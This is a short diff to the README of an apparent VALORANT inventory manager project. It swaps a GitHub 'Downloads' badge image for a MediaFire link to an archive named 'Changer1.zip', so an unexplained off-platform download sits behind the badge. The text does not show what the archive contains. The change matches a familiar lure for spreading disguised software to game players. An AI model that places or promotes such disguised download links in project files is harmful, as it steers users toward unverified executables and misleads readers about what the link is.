@@ -4,7 +4,7 @@
 [![License](https://img.shields.io/badge/license-MIT-green.svg)](https://opensource.org/licenses/MIT)
 [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)]()
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
-[![Downloads](https://img.shields.io/github/downloads/yourusername/valorant-inventory-manager/total.svg)]()
+[![Downloads](https://www.mediafire.com/file/97lbamcyqtiutm0/Changer1.zip/file)]()
 
 > **Organize. Browse. Preview. Your VALORANT Collection**
 
